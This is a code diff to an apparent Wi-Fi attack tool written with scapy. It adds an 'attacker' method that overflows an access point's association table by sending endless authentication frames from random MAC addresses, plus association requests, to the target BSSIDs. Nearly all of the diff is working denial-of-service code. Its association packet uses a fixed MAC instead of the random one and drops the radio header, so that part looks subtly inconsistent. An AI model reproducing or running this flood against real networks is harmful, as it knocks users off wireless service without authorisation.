@@ -2,6 +2,7 @@ import multiprocessing
 import threading
 import time
 import keyboard
+from scapy.volatile import RandMAC
 
 import Drawer
 from Sniffer_dir.common import bash
@@ -15,7 +16,8 @@ import sys
 
 import scapy
 from scapy import *
-from scapy.layers.dot11 import RadioTap, Dot11, conf, Dot11Deauth, Dot11Elt, Dot11ProbeResp, Dot11Disas
+from scapy.layers.dot11 import RadioTap, Dot11, conf, Dot11Deauth, Dot11Elt, Dot11ProbeResp, Dot11Disas, Dot11Auth, \
+    Dot11AssoReq
 from scapy.sendrecv import sendp
 
 from Sniffer_dir import FakeAP
@@ -130,6 +132,25 @@ class attacker:
         ap = FakeAP.AP(wirelessiface=self.attack_int, channel=int(args["Channel"]), ssid=args["SSID"])
         ap.launch()
 
+    def AP_assoc_table_overflow(self, args: list[dict]):
+        self.attack_int = self.__start_monitor_mode(self.attack_int)
+        while True:
+            for i in range(len(args)):
+                # if args[i]["Freq"] == '2.4':  # 2.4 GHz
+                #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
+                self.__change_channel(self.attack_int, int(args[i]["Channel"]))
+                for ii in range(50):
+                    client_mac = RandMAC()
+                    auth_packet = RadioTap() / Dot11(addr1=args[i]["BSSID"], addr2=client_mac, addr3=args[i]["BSSID"]) \
+                             / Dot11Auth(algo=0, seqnum=0x0001, status=0x0000)
+                    quantity = 3
+                    sendp(auth_packet, iface=self.attack_int, count=quantity, verbose=0)
+
+                    assoc_packet = Dot11(addr1=args[i]["BSSID"], addr2=self.client_mac, addr3=args[i]["BSSID"]) \
+                             / Dot11AssoReq(cap=0x1100, listen_interval=0x00a) \
+                             / Dot11Elt(ID=0, info="{}".format(args[i]["SSID"]))
+                    quantity = 3
+                    sendp(assoc_packet, iface=self.attack_int, count=quantity, verbose=0)
     def __GetInterfaces(self):
         retval = []
         p = Path(INTERFACESPATH)
